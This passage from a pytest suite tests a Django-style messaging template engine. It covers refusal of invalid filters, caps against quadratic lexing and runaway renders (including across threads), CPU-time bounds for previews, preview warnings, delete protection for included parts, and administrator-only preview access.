        ("{{ 5 }}{{ 1.5 }}{{ 'x' }}", False),
        ("{{ x|floatformat:' 7' }}", True),
        ("{{ x|floatformat:'1_000' }}", True),
        ("{{ x|floatformat:1e3 }}", True),
        ("{{ x|floatformat:'6g' }}", False),
        ("{{ x|linebreaksbr:'a' }}", True),
        # Rule 5 refuses what Django's filters raise on rather than refuse (Django review 2, p7, q8).
        ("{{ x|floatformat:'' }}", True),
        ("{{ x|floatformat:1e400 }}", True),
        ("{{ x|floatformat:'abc' }}", True),
        ("{{ x|truncatechars:1e400 }}", True),
        ("{{ x|truncatewords:'many' }}", True),
        ("{{ x|yesno:1 }}", True),
        ("{{ x|pluralize:2 }}", True),
        ("{{ 'x'|date:'U' }}", True),
        ("{{ lang|date:'U' }}", True),
        ("{% for i in items %}{{ forloop.counter|date:'U' }}{% endfor %}", True),
        ("{% with d=lang %}{{ d|date }}{% endwith %}", True),
        ("{{ x|date:'U' }}{% with d=x %}{{ d|date }}{% endwith %}", False),
        ("{{ x|yesno:'a,b' }}{{ x|pluralize:'es' }}{{ x|truncatechars:'5' }}{{ x|floatformat:'-2u' }}", False),
        ("{% with x as y %}{{ y }}{% endwith %}", False),
        ("{% for i in items reversed %}{{ i }}{% endfor %}", False),
        ("{% if x|length > 2 and not y or y not in 'abc' %}z{% endif %}", False),
    ):
        refusals = _refusals(_unsaved(source=source, variables={"x": "x", "y": "x", "items.*": "x"},
                                      format="html", text_source="x"))
        assert bool(refusals) is refused, (source, refusals)
    rendered = _render(_mail("{{ amount|floatformat:'2g' }}", {"amount": "x"}, language="de", key="tests.amount"),
                       {"amount": Decimal("1234.5")}, kit)
    assert rendered.plain_text.strip() == "1.234,50"


def test_line_caps_bound_lexing(plain: Any) -> None:
    """p8, p9, p15, q14c: what makes lexing or Markdown quadratic is refused before either runs."""

    del plain
    rows = {
        "unclosed": "{{" * 25_000,
        "brackets": ("[" * 999 + "\n") * 50,
        "images": (("![" * 499)[:999] + "\n") * 50,
        "long-line": "x" * 50_000,
    }
    for case, source in rows.items():
        started = time.process_time()
        assert _refusals(_unsaved(source=source)), case
        assert time.process_time() - started < 0.2, case
    started = time.process_time()
    admitted = (("{{" * 30 + "x" * 999)[:999] + "\n") * 50
    assert any("text holds {{" in message for message in _refusals(_unsaved(source=admitted)))
    assert time.process_time() - started < 1.0


def test_budget_sticky_through_if(plain: Any, kit: Any) -> None:
    """p10, q9: once spent, every charge raises, even where an if operator swallowed the first; per thread and task."""

    del plain, kit
    engine = MessageTemplateEngine(autoescape=True)
    swallowing = engine.from_string('{% if x|upper == "A" %}T{% else %}F{% endif %}' * 2 + "tail")
    budget = RenderBudget(filter_input=150)
    with pytest.raises(RenderBudgetExceeded), budget.spend():
        swallowing.render(engine.context({"x": "a"}))
    assert budget.exceeded and RENDER_BUDGET.get(None) is None
    with pytest.raises(LookupError, match="RenderBudget.spend"):
        engine.from_string("{{ x|upper }}").render(engine.context({"x": "a"}))
    looping = engine.from_string("{% for i in items %}{{ i|upper }}{% endfor %}")
    results: dict[int, Any] = {}

    def worker(index: int, size: int) -> None:
        try:
            with RenderBudget().spend():
                results[index] = len(looping.render(engine.context({"items": ["a"] * size})))
        except RenderBudgetExceeded:
            results[index] = "exceeded"

    threads = [threading.Thread(target=worker, args=(index, 400 if index % 2 else 600)) for index in range(6)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert results == {index: 400 if index % 2 else "exceeded" for index in range(6)}

    async def concurrently() -> list[Any]:
        def render(size: int) -> int:
            with RenderBudget().spend():
                return len(looping.render(engine.context({"items": ["a"] * size})))

        return list(await asyncio.gather(*(sync_to_async(render)(400) for _ in range(3))))

    assert asyncio.run(concurrently()) == [400, 400, 400]
    assert RENDER_BUDGET.get(None) is None


def test_include_renders_charge_the_budget(plain: Any, kit: Any) -> None:
    """p14: each include render charges an iteration, so includes in a loop stop at the pass's 500."""

    del plain
    _row("part", "empty", source="")
    looping = _mail("{% for i in items %}\n\n" + '{% include "parts/empty" only %}\n\n' * 2 + "{% endfor %}",
                    {"items.*": "x"})
    started = time.process_time()
    with pytest.raises(RenderBudgetExceeded):
        _render(looping, {"items": [0] * 300}, kit)
    assert time.process_time() - started < 1.0
    assert _render(looping, {"items": [0] * 166}, kit).plain_text.strip() == ""


def test_walk_stops_expanding_at_its_node_bound(plain: Any) -> None:
    """Nodes count once per include site; past 1,000 the walk stops, so nested includes cannot multiply its work."""

    del plain
    fan = "\n".join([('{% include "blocks/next" only %}') * 30] * 10)
    _row("block", "last", source="<b>x</b>", text_source="x")
    _row("block", "next", source=fan.replace("blocks/next", "blocks/last"), text_source="x")
    _row("block", "fan", source=fan, text_source="x")
    template = _unsaved(source=fan.replace("blocks/next", "blocks/fan"), format="html", text_source="x")
    started = time.process_time()
    assert any("over 1000 nodes" in message for message in _refusals(template))
    assert time.process_time() - started < 1.0


def test_walk_character_cap(plain: Any) -> None:
    """q4: the rows one walk reaches hold at most 150,000 characters, each counted before it is parsed."""

    del plain
    big = "\n".join(["x" * 999] * 50)
    for index in range(4):
        _row("part", f"big{index}", source=big)
    template = _unsaved(source="\n\n".join(f'{{% include "parts/big{index}" only %}}' for index in range(4)))
    started = time.process_time()
    refusals = _refusals(template)
    assert any("over 150000 characters" in message for message in refusals), refusals
    assert time.process_time() - started < 2.0


# ---------- the timed passes ----------

DEEP = "a." + ".".join(["b"] * 7)
"""The longest path a row declares: eight segments."""


def _loop(lines: list[str]) -> str:
    return "{% for i in items %}\n" + "\n".join(lines) + "\n{% endfor %}"


def _deep_ifs(count: int) -> list[str]:
    return [("{% if " + DEEP + " %}{% endif %}") * 15] * count


DATED = ["{% with x=d|date:'rrrrrrrrrrrrrrrrrrrr' %}{% endwith %}" * 10]
TIMED_VALUES = {"items": [0] * 500, "a": {}, "d": "2026-11-24T15:30:00+00:00"}
TIMED_VARIABLES = {"items.*": "x", DEEP: "x", "d": "x"}


@pytest.mark.parametrize(
    ("rows", "values"),
    [
        pytest.param({"source": _loop(_deep_ifs(31))}, TIMED_VALUES, id="q1-deep-operands"),
        pytest.param({"source": _loop(DATED + _deep_ifs(31))}, TIMED_VALUES, id="q11b-combined"),
        pytest.param({"source": "\n".join(["{{ q }}" * 29] * 10), "variables": {"q": "x"}}, {"q": '"' * 10_000},
                     id="p11-outputs-outside-loops"),
    ],
)
def test_pass_time(plain: Any, kit: Any, rows: dict[str, Any], values: dict[str, Any]) -> None:
    """One pass of the costliest rows the caps admit takes under a second of CPU (passes 2 to 4, one heavy)."""

    del plain
    template = _mail(rows["source"], rows.get("variables", TIMED_VARIABLES), format="html", text_source="x")
    walk = _walk(template)
    started = time.process_time()
    with system_context(reason="tests.messaging_templates.render.timed"):
        walk.render(values, kit=kit)
    spent = time.process_time() - started
    print(f"pass CPU {spent:.3f}s")  # noqa: T201 -- the report quotes it
    assert spent < 1.0


def test_preview_time(plain: Any, kit: Any) -> None:
    """The costliest previews the caps admit take under two seconds of CPU, walk, prepare() and passes 2 to 4 together.

    Admitted: a q11b loop in both forms beside two Markdown rows of 50,000 characters of ``*_`` (the costliest row
    pattern) inside ``{% comment %}`` (a full row check for one node, q4). Refused: a walk reaching 150,000
    characters of ``*_`` rows whose HTML forms pass the text cap only when the walk is over.
    """

    del plain
    star_lines = [("*_" * 499)[:999]] * 49
    commented = "{% comment %}\n\n" + "\n".join(star_lines) + "\n\n{% endcomment %}"
    for index in range(3):
        # Just under a third of the walk's 150,000 characters each, so all three are checked, then refused.
        _row("part", f"star{index}", source="\n".join([line[:996] for line in [*star_lines, star_lines[0]]]))
        _row("part", f"hidden{index}", source=commented)
    loop = _loop(DATED + _deep_ifs(30))
    admitted = _mail(
        loop + '\n{% include "parts/hidden0" only %}{% include "parts/hidden1" only %}', TIMED_VARIABLES,
        format="html", text_source=loop, key="tests.admitted",
        # The two includes charge two of the pass's 500 iterations.
        sample={**TIMED_VALUES, "items": [0] * 498},
    )
    refused = _mail("\n\n".join(f'{{% include "parts/star{index}" only %}}' for index in range(3)),
                    key="tests.refused")
    spent = {}
    for name, template in (("admitted", admitted), ("refused", refused)):
        started = time.process_time()
        with system_context(reason="tests.messaging_templates.render.timed"):
            preview = template.preview(kit=kit)
        spent[name] = time.process_time() - started
        assert (preview.rendered is not None) is (name == "admitted"), preview.warnings
        if name == "refused":
            assert "over 200000 characters of text" in preview.warnings[0].detail, preview.warnings
    print(f"preview CPU {spent}")  # noqa: T201 -- the report quotes it
    assert max(spent.values()) < 2.0


# ---------- preview, its warnings and its read ----------


def test_preview_warnings(plain: Any, kit: Any) -> None:
    del plain
    template = _mail(
        "{{ name }}", {"name": "x", "spare": "x", "unsubscribe_url": "x"},
        subject="s" * 61, preheader="", sample={"name": "Ana", "unsubscribe_url": "https://example.test/stop"},
    )
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = template.preview(kit=kit)
    assert {warning.code for warning in preview.warnings} == {
        TemplateWarningCode.SUBJECT_LENGTH, TemplateWarningCode.PREHEADER, TemplateWarningCode.UNUSED_VARIABLE,
        TemplateWarningCode.STOP_LINK,
    }
    assert any("spare" in warning.detail for warning in preview.warnings)
    empty = _mail("{% if name %}{% endif %}", {"name": "x"}, key="tests.empty", sample={"name": ""})
    big = _mail("{{ name }}" * 11, {"name": "x"}, key="tests.big", sample={"name": "x" * 9_999},
                format="html", text_source="x")
    with system_context(reason="tests.messaging_templates.render.preview"):
        assert TemplateWarningCode.PLAIN_TEXT in {warning.code for warning in empty.preview(kit=kit).warnings}
        assert TemplateWarningCode.SIZE in {warning.code for warning in big.preview(kit=kit).warnings}


def test_a_layout_previews_around_a_fixed_body_and_a_block_alone(plain: Any, kit: Any) -> None:
    with system_context(reason="tests.messaging_templates.render.preview"):
        layout = plain.preview(kit=kit)
        block = _row("block", "card", source="<b>{{ title }}</b>", text_source="{{ title }}",
                     variables={"title": "x"}, sample={"title": "Tuner"}).preview(kit=kit)
    assert layout.rendered is not None and "<title>A message in this layout</title>" in layout.rendered.html
    assert "A template writes its message here." in layout.rendered.plain_text
    assert block.rendered is not None and block.rendered.html == "<b>Tuner</b>"
    assert block.warnings == []


def test_deleting_an_included_block_or_part_is_refused_while_its_key_would_stop_resolving(plain: Any) -> None:
    del plain
    part = _row("part", "used", source="Used.")
    _row("part", "used", language="es", source="Usado.")
    _row("part", "unused", source="Unused.")
    _mail('{% include "parts/used" only %}')
    with system_context(reason="tests.messaging_templates.render.delete"):
        with pytest.raises(ValidationError, match="Other message templates use this part"):
            part.delete()
        MessageTemplate.objects.get(key="unused").delete()
        MessageTemplate.objects.get(key="used", language="es").delete()


def test_a_delete_checks_each_row_naming_its_key_once(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """Fix 6: the delete preview and the pre_delete receiver share each candidate's include check."""

    del plain
    part = _row("part", "shared", source="Shared.")
    for index in range(3):
        _mail('{% include "parts/shared" only %}' + f"\n\nNaming {index}.", key=f"tests.naming{index}")
    checked: list[str] = []
    check = TemplateWalker._check
    monkeypatch.setattr(TemplateWalker, "_check", lambda walker, row, name: checked.append(name) or check(
        walker, row, name))
    with system_context(reason="tests.messaging_templates.render.delete"):
        first = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
        held = len(checked)
        second = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
    assert first is not None and first == second
    assert held <= 3 and len(checked) == held


def test_a_load_reports_what_a_deployment_row_breaks_and_completes(
    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture,
) -> None:
    """D1: a refusal reached only through a deployment's row is logged, not raised; a shipped defect fails the load."""

    del plain
    _row("layout", "shipped", is_baseline=True)
    shipped = _row("part", "named", source="{{ who|default:'' }}", variables={"who": "x"}, is_baseline=True)
    template = _row("template", "tests.loaded", source='{% include "parts/named" with who=name only %}',
                    variables={"name": "x"}, layout="shipped", is_baseline=True)
    with system_context(reason="tests.messaging_templates.render.load"):
        override = MessageTemplate.objects.override(shipped)
        override.source, override.variables = "{{ who }} {{ extra }}", {"who": "x", "extra": "x"}
        override.save()  # past clean: the override asks for an argument the shipped template never passes
        with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
            MessageTemplate.after_resource_load([template], tier="install", source="tests")
        template.source += "\n\nMore."
        template.full_clean()  # a baseline is judged among the shipped rows alone
    (record,) = [record for record in caplog.records if record.name == "angee.messaging_templates.models"]
    assert "tests.loaded (en)" in record.getMessage() and "parts/named (en)" in record.getMessage()
    assert "which it was not passed" in record.getMessage()
    with pytest.raises(ValidationError, match="which it was not passed"):
        _render(template, {"name": "Ana"}, kit)
    _row("part", "needy", source="{{ needed }}", variables={"needed": "x"}, is_baseline=True)
    broken = _row("template", "tests.broken", source='{% include "parts/needy" only %}', layout="shipped",
                  is_baseline=True)
    with system_context(reason="tests.messaging_templates.render.load"), pytest.raises(
            ValidationError, match="which it was not passed"):
        MessageTemplate.after_resource_load([broken], tier="install", source="tests")


_PREVIEW = """
query($id: ID!, $kit: ID) {
  message_template_preview(template: $id, brand_kit: $kit) {
    rendered { subject preheader html plain_text language }
    warnings { code detail }
  }
}
"""


def test_preview_is_an_administrators_read(plain: Any, kit: Any) -> None:
    del plain
    admin = create_platform_admin("messaging-templates-previewer")
    member = create_user("messaging-templates-reader")
    template = _mail("Hi {{ name }}, from {{ brand.name }}.", {"name": "x"}, sample={"name": "Ana"})
    with system_context(reason="tests.messaging_templates.render.kit"):
        other = BrandKit.objects.create(**{**ANGEE, "name": "Other"})
    schema = addon_schema(messaging_templates_schema.schemas, "console")
    variables = {"id": public_id_of(template), "kit": None}
    preview = result_data(execute_schema(schema, _PREVIEW, variables, user=admin))["message_template_preview"]
    assert preview["rendered"]["plain_text"] == "Hi Ana, from Acme.\n" and preview["warnings"] == []
    themed = result_data(execute_schema(schema, _PREVIEW, {**variables, "kit": public_id_of(other)}, user=admin))
    assert themed["message_template_preview"]["rendered"]["plain_text"] == "Hi Ana, from Other.\n"
    refusals = {}
    for name, refused in (("member", member), ("anonymous", AnonymousUser())):
        (error,) = execute_schema(schema, _PREVIEW, variables, user=refused).errors
        refusals[name] = (error.extensions["code"], error.message)
    assert refusals["member"][0] == "PERMISSION_DENIED"
    assert refusals["anonymous"] == ("PERMISSION_DENIED", "Authentication required.")
    broken = _mail("{% if %}", key="tests.broken")
    result = result_data(execute_schema(schema, _PREVIEW, {"id": public_id_of(broken), "kit": None}, user=admin))
    assert result["message_template_preview"]["rendered"] is None
    assert result["message_template_preview"]["warnings"][0]["code"] == "RENDER_ERROR"
    assert re.search(r"does not compile", result["message_template_preview"]["warnings"][0]["detail"])
